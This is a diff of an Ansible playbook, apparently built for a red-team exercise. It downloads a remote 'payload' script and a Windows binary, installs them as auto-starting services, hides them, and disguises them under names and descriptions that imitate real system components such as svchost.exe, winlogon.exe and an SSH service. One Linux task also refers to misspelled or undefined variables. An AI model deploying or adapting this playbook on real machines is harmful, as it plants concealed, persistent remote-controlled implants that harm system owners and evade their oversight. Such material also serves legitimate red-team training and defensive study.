@@ -1,83 +1,103 @@
 ---
-  - name: Linux | Define Distributions
-    set_fact:
-      linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+- name: Linux | Define Distributions
+  set_fact:
+    linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
 
-  - name: Linux | Make Directory
-    ansible.builtin.file:
-      path: /var/log/asa/osa
-      state: directory
-    when: ansible_os_family in linux_distros
+- name: Linux | Define Paths, File/Service Names, and Service Descriptions
+  set_fact:
+    linux_paths: ["/usr/bin/", "/bin/", "/etc/", "/lib/"]
+    linux_file_names: ["systemd-ssh", "snapd.container", "apparmour", "systemd-logind-ssh", "firewall"]
+    linux_service_descriptions: ["Secure Shell Service", "Secure Container for snapd", "Load AppArmour profiles", "User Login Management for SSH", "Firewall"]
+  when: ansible_os_family in linux_distros
 
-  - name: Linux | Download Agent
-    get_url:
-      url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
-      dest: /var/log/asa/osa/java-23.0.1-bin-java.sh
-      mode: '0755'
-    when: ansible_os_family in linux_distros
+- name: Linux | Select Random Path and Random Index for Service Name and Description
+  set_fact:
+    linux_random_path: "{{ linux_paths | random_choice }}"
+    linux_random_index: "{{ range(0, linux_file_names | length) | random }}"
+  when: ansible_os_family in linux_distros
 
-  - name: Linux | Download Service File
-    get_url:
-      url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads
-      dest: /lib/systemd/system/java-23.0.1-bin-java.service
-      mode: 644
-    when: ansible_os_family in linux_distros
+- name: Linux | Select Random File/Service Name and Description
+  set_fact:
+    linux_random_file_name: "{{ linus_file_names[random_index] }}"
+    linux_random_service_description: "{{ linux_service_descriptions[random_index] }}"
+  when: ansible_os_family in linux_distros
 
-  - name: Linux | Reload Service Daemons
-    systemd:
-      daemon_reload: yes
-    when: ansible_os_family in linux_distros
+- name: Linux | Download Agent
+  get_url:
+    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
+    dest: "{{ linux_random_path }}{{ linux_random_file_name }}.sh"
+    mode: '0755'
+  when: ansible_os_family in linux_distros
 
-  - name: Linux | Stop Service
-    service:
-      name: java-23.0.1-bin-java
-      state: stopped
-    when: ansible_os_family in linux_distros
+- name: Linux | Download Service File
+  get_url:
+    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads
+    dest: "/lib/systemd/system/{{ linux_random_file_name }}.service"
+    mode: 644
+  when: ansible_os_family in linux_distros
 
-  - name: Linux | Start and Enable Service
-    service:
-      name: java-23.0.1-bin-java
-      enabled: yes
-      state: started
-    when: ansible_os_family in linux_distros
+- name: Linux | Edit Service File
+  ansible.builtin.lineinfile:
+    path: "/lib/systemd/system/{{ linux_random_file_name }}.service"
+    regexp: "ExecStart=/var/log/asa/osa/java-23.0.1-bin-java.sh"
+    line: "ExecStart={{ linux_random_path }}{{ linux_random_file_name }}.sh"
+  when: ansible_os_family in linux_distros
 
-  - name: Windows | Define Paths, File Names, Service Names, and Service Descriptions
-    set_fact:
-      windows_paths: ["C:\\Windows\\fonts\\", "C:\\Program Files\\Windows NT\\Accessories\\", "C:\\Program Files\\Windows Defender\\", "C:\\ProgramData\\Microsoft\\Diagnosis\\", "C:\\Windows\\Speech\\Engines\\TTS\\", "C:\\Windows\\Cursors\\"]
-      windows_file_names: ["svchost.exe", "MsSense.exe", "conhost.exe", "wininit.exe", "winlogon.exe", "smartscreen.exe"]
-      windows_service_names: ["Windows Store Service", "Hyper-V Remote Management Service", "Network Connection Setup Service", "Remote Desktop Container", "TCP/IP NetBIOS Container"]
-      windows_service_descriptions: ["This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly", "Provides an interface for remote hosts to communicate with Hyper-V hypervisors", "Responsible for setting up and tearing down network connections", "Secure Container for the Remote Desktop Service to run within", "Secure Container for NetBIOS over TCP/IP (NetBT) service"]
-    when: ansible_os_family == "Windows"
-    
-  - name: Windows | Select Random Path and File Name
-    set_fact:
-      windows_random_path: "{{ windows_paths | random_choice }}"
-      windows_random_file_name: "{{ windows_file_names | random_choice }}"
-    when: ansible_os_family == "Windows"
+- name: Linux | Reload Service Daemons
+  systemd:
+    daemon_reload: yes
+  when: ansible_os_family in linux_distros
 
-  - name: Windows | Select Random Index for Service Name and Description
-    set_fact:
-      random_index: "{{ range(0, windows_service_names | length) | random }}"
-    when: ansible_os_family == "Windows"
+- name: Linux | Stop Service
+  service:
+    name: "{{ linux_random_file_name }}"
+    state: stopped
+  when: ansible_os_family in linux_distros
 
-  - name: Windows | Select Random Service and Description
-    set_fact:
-      windows_random_service_name: "{{ windows_service_names[random_index] }}"
-      windows_random_service_description: "{{ windows_service_descriptions[random_index] }}"
-    when: ansible_os_family == "Windows"
+- name: Linux | Start and Enable Service
+  service:
+    name: "{{ linux_random_file_name }}"
+    enabled: yes
+    state: started
+  when: ansible_os_family in linux_distros
 
-  - name: Windows | Download agent
-    win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads
-    when: ansible_os_family == "Windows"
+- name: Windows | Define Paths, File Names, Service Names, and Service Descriptions
+  set_fact:
+    windows_paths: ["C:\\Windows\\fonts\\", "C:\\Program Files\\Windows NT\\Accessories\\", "C:\\Program Files\\Windows Defender\\", "C:\\ProgramData\\Microsoft\\Diagnosis\\", "C:\\Windows\\Speech\\Engines\\TTS\\", "C:\\Windows\\Cursors\\"]
+    windows_file_names: ["svchost.exe", "MsSense.exe", "conhost.exe", "wininit.exe", "winlogon.exe", "smartscreen.exe"]
+    windows_service_names: ["Windows Store Service", "Hyper-V Remote Management Service", "Network Connection Setup Service", "Remote Desktop Container", "TCP/IP NetBIOS Container"]
+    windows_service_descriptions: ["This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly", "Provides an interface for remote hosts to communicate with Hyper-V hypervisors", "Responsible for setting up and tearing down network connections", "Secure Container for the Remote Desktop Service to run within", "Secure Container for NetBIOS over TCP/IP (NetBT) service"]
+  when: ansible_os_family == "Windows"
   
-  - name: Windows | Hide Agent
-    win_command: "attrib +h '{{ windows_random_path }}{{ windows_random_file_name}}'"
-    when: ansible_os_family == "Windows"
+- name: Windows | Select Random Path and File Name
+  set_fact:
+    windows_random_path: "{{ windows_paths | random_choice }}"
+    windows_random_file_name: "{{ windows_file_names | random_choice }}"
+  when: ansible_os_family == "Windows"
 
-  - name: Windows | Register Service
-    ansible.windows.win_shell: New-Service -name '{{ windows_random_service_name }}' -BinaryPathName '{{ windows_random_path }}{{ windows_random_file_name}}' -DisplayName '{{ windows_random_service_name }}' -Description '{{ windows_random_service_description }}' -Startuptype Automatic
-    when: ansible_os_family == "Windows"
+- name: Windows | Select Random Index for Service Name and Description
+  set_fact:
+    random_index: "{{ range(0, windows_service_names | length) | random }}"
+  when: ansible_os_family == "Windows"
 
-  - name: Windows | Start Service
-    ansible.windows.win_shell: Start-Service -name '{{ windows_random_service_name }}'
-    when: ansible_os_family == "Windows"
+- name: Windows | Select Random Service and Description
+  set_fact:
+    windows_random_service_name: "{{ windows_service_names[random_index] }}"
+    windows_random_service_description: "{{ windows_service_descriptions[random_index] }}"
+  when: ansible_os_family == "Windows"
+
+- name: Windows | Download agent
+  win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads
+  when: ansible_os_family == "Windows"
+
+- name: Windows | Hide Agent
+  win_command: "attrib +h '{{ windows_random_path }}{{ windows_random_file_name}}'"
+  when: ansible_os_family == "Windows"
+
+- name: Windows | Register Service
+  ansible.windows.win_shell: New-Service -name '{{ windows_random_service_name }}' -BinaryPathName '{{ windows_random_path }}{{ windows_random_file_name}}' -DisplayName '{{ windows_random_service_name }}' -Description '{{ windows_random_service_description }}' -Startuptype Automatic
+  when: ansible_os_family == "Windows"
+
+- name: Windows | Start Service
+  ansible.windows.win_shell: Start-Service -name '{{ windows_random_service_name }}'
+  when: ansible_os_family == "Windows"
